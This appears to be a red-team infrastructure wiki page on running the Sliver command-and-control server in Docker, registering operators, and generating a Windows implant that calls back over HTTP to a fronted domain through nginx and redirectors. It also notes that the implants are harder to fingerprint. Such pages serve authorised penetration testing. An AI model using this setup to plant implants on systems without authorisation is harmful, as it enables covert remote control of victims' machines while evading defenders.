# Sliver C2

[Sliver](https://github.com/BishopFox/sliver) is a modern, open-source, cross-platform C2 written in Go. It
supports mTLS, WireGuard, HTTP(S), and DNS implants, has a multiplayer team server, and ships as a single static
binary.

It replaces the role that SilentTrinity and Empire used to fill: open-source post-exploitation against Windows
targets, but with first-class Linux and macOS implants too, and active maintenance.

## Container

A small Dockerfile keeps the team server portable across hosts:

```text
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates curl mingw-w64 && \
    rm -rf /var/lib/apt/lists/*

ARG SLIVER_VERSION=v1.7.3
RUN curl -fsSL https://github.com/BishopFox/sliver/releases/download/${SLIVER_VERSION}/sliver-server_linux \
        -o /usr/local/bin/sliver-server && \
    chmod +x /usr/local/bin/sliver-server

EXPOSE 31337 8888 53/udp

ENTRYPOINT ["sliver-server", "daemon"]
```

Build and run:

```text
root@tardis:~/# docker build -t sliver .
root@tardis:~/# docker run -d \
    -v /opt/sliver:/root/.sliver \
    -p 31337:31337 -p 8888:8888 \
    sliver
```

The persisted volume `/opt/sliver` keeps generated implants, certificates, and operator profiles across container
restarts.

## Operator client

Operators connect to the team server with a generated config:

```text
root@tardis:~/# docker exec -it <id> sliver-server operator \
    --name op --lhost <host> --save /tmp/op.cfg
root@tardis:~/# scp <host>:/tmp/op.cfg ./op.cfg
$ sliver import op.cfg
$ sliver
```

## Generating implants

Inside the Sliver console:

```text
sliver > generate --http <frontend-domain> --os windows --arch amd64 --save /tmp/imp.exe
sliver > http --domain <frontend-domain> --lport 8888
```

The HTTP listener fronts behind the [frontend nginx](../frontend/nginx.md) and pairs with the chosen
[redirector](../redirectors/index.rst).

## Choosing Sliver

* Active development and maintained signatures.
* Multiplayer team server out of the box.
* Implants in Go, harder to fingerprint than the older PowerShell or .NET frameworks.
* No commercial licence, no telemetry phoning home.
